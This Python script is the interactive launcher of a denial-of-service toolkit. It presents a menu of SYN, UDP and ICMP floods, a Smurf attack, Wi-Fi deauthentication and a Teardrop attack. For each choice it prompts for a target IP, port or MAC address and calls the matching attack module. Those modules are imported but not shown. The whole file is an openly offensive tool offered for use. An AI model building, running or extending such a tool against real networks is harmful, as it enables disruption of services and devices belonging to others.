import Scripts.Deauther as Deauther, \
Scripts.SYNFlooder as SYNFlooder, \
Scripts.UDPFlooder as UDPFlooder, \
Scripts.ICMPFlooder as ICMPFlooder, \
Scripts.Smurf as Smurf, Scripts.Teardropper as Teardropper

def list_choice(choices=list()):
    menu = """
    Options:
    1) SYN flood
    2) UDP flood
    3) ICMP flood
    4) Smurf attack
    5) Deauthentication
    6) Teardrop
    """

    if len(choices) == 0:
        print(menu)



if __name__ == "__main__":
    choices = []
    list_choice(choices)

    res = input(">> ")
    choices.append(int(res))
    
    if choices[0] == 1:
        print("Insert target IP")
        target_ip = input(">> ")
        print("Insert port")
        port = int(input(">> "))

        SYNFlooder.flood(target_ip=target_ip, target_port=port)
    elif choices[0] == 2:
        print("Insert target IP")
        target_ip = input(">> ")
        print("Insert port")
        port = int(input(">> "))

        UDPFlooder.flood(target_ip=target_ip, target_port=port)
    elif choices[0] == 3:
        print("Insert target IP")
        target_ip = input(">> ")

        ICMPFlooder.flood(target_ip=target_ip)
    elif choices[0] == 4:
        print("Insert target IP")
        target_ip = input(">> ")

        Smurf.attack(target_ip=target_ip)
    
    elif choices[0] == 5:
        print("Insert target MAC")
        target_mac = input(">> ")
        print("Insert gateway MAC")
        gateway_mac = input(">> ")
        print("Insert network interface")
        iface = input(">> ")
        print("Insert packet count to send")
        count = input(">> ")

        Deauther.deauth(target_mac=target_mac, gateway_mac=gateway_mac, interface=iface, count=count)

    elif choices[0] == 6:
        print("Insert target IP")
        target_ip = input(">> ")

        Teardropper.attack(target_ip=target_ip)
